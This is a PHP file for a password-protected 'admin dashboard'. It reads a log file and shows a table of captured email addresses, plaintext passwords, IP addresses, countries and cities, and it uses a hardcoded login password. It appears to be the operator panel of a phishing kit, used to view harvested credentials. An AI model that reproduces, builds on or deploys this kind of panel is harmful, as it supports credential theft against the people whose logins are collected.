<?php
session_start();

// Check if the user is already logged in
if (!isset($_SESSION['logged_in']) || $_SESSION['logged_in'] !== true) {
    // If not logged in, check if the form was submitted
    if ($_SERVER['REQUEST_METHOD'] == 'POST') {
        $password = $_POST['password'];
        if ($password === 'backup') {
            $_SESSION['logged_in'] = true;
        } else {
            $error = "Invalid password";
        }
    }
    
    // If still not logged in, show the login form
    if (!isset($_SESSION['logged_in']) || $_SESSION['logged_in'] !== true) {
        ?>
        <!DOCTYPE html>
        <html>
        <head>
            <title>Login</title>
            <style>
                body {
                    font-family: Arial, sans-serif;
                    background-color: rgb(46,71,93);
                    display: flex;
                    justify-content: center;
                    align-items: center;
                    height: 100vh;
                    margin: 0;
                }
                form {
                    background-color: white;
                    padding: 20px;
                    border-radius: 5px;
                    box-shadow: 0 0 10px rgba(0,0,0,0.1);
                }
                input[type="password"] {
                    width: 100%;
                    padding: 10px;
                    margin: 10px 0;
                    border: 1px solid #ddd;
                    border-radius: 4px;
                }
                input[type="submit"] {
                    background-color: #337357;
                    color: white;
                    border: none;
                    padding: 10px 20px;
                    border-radius: 4px;
                    cursor: pointer;
                }
                .error {
                    color: red;
                    margin-bottom: 10px;
                }
            </style>
        </head>
        <body>
            <form method="post">
                <h2>Admin Login</h2>
                <?php if (isset($error)) echo "<p class='error'>$error</p>"; ?>
                <input type="password" name="password" placeholder="Enter password" required>
                <input type="submit" value="Login">
            </form>
        </body>
        </html>
        <?php
        exit();
    }
}

// If we're here, the user is logged in. Continue with the dashboard code.
?>
<!DOCTYPE html>
<html>
  <head>
    <title>Admin Dashboard</title>
    <style>
      /* Your existing styles here */
      body {
        background-color: #f2f2f2;
        font-family: Arial, sans-serif;
      }
      
      table {
        width: 100%;
        margin: 20px 0;
        background-color: #fff;
        border: 2px solid #ddd;
        border-radius: 10px;
        overflow: hidden;
        box-shadow: 0 0 10px rgba(0, 0, 0, 0.2);
      }
      
      th {
        background-color:#337357;
        color: white;
        text-align: left;
        padding: 12px;
      }
      
      td {
        border-bottom: 1px solid #ddd;
        padding: 12px;
      }
      
      td:first-child {
        width: 20px;
        text-align: center;
      }
      
      tr:nth-child(even) {
        background-color: #f2f2f2;
      }
      
      tr:hover {
        background-color: #ddd;
      }
      .btn, .btn2 {
        background-color:#337357;
        color: white;
        border-radius: 15px;
        padding: 10px;
        margin-right: 10px;
        cursor: pointer;
        border: none;
        margin-bottom: 5px;
        font-size: 14px;
      }
      .logout {
        float: right;
      }
    </style>
  </head>
  <body style="background-color:rgb(46,71,93);">
    <center><h1 style="color:rgb(221,221,221);font-family:Impact, sans-serif;">ADMIN DASHBOARD</h1></center>
    <div class="btns">
      <a href="delete.html"><button class="btn">Clear Dashboard</button></a>
      <a href="./user/upload_image.php"><button class="btn2">Image Editor</button></a>
      <a href="?logout=1"><button class="btn logout">Logout</button></a>
    </div>
    <?php
      // Logout functionality
      if (isset($_GET['logout'])) {
        session_destroy();
        header("Location: " . $_SERVER['PHP_SELF']);
        exit();
      }

      // Open the log file for reading
      $log_file = fopen("./user/log.txt", "r");
      
      // Check if the file exists
      if (!$log_file) {
        echo "<p>No log data available.</p>";
      } else {
        // Create an HTML table to display the log data
        echo "<table>";
        echo "<tr><th>#</th><th>Date/Time</th><th>Email</th><th>Password</th><th>IP Address</th><th>Country</th><th>City</th></tr>";
        
        // Initialize row number to 1
        $row_number = 1;
        
        // Loop through each line in the log file
        while (!feof($log_file)) {
          $line = fgets($log_file);
          $fields = explode("=", $line);
          
          // Output each variable and its value as a cell in the table
          if ($fields[0] == "Date") {
            echo "<tr><td>" . $row_number . "</td><td>" . htmlspecialchars($fields[1]) . "</td>";
            $row_number++;
          } elseif ($fields[0] == "Email") {
            echo "<td>" . htmlspecialchars($fields[1]) . "</td>";
          } elseif ($fields[0] == "Password") {
            echo "<td>" . htmlspecialchars($fields[1]) . "</td>";
          } elseif ($fields[0] == "IP Address") {
            echo "<td>" . htmlspecialchars($fields[1]) . "</td>";
          } elseif ($fields[0] == "Country") {
            echo "<td>" . htmlspecialchars($fields[1]) . "</td>";
          } elseif ($fields[0] == "City") {
            echo "<td>" . htmlspecialchars($fields[1]) . "</td></tr>";
          }
        }
        
        echo "</table>";
        
        // Close the log file
        fclose($log_file);
      }
    ?>
  </body>
</html>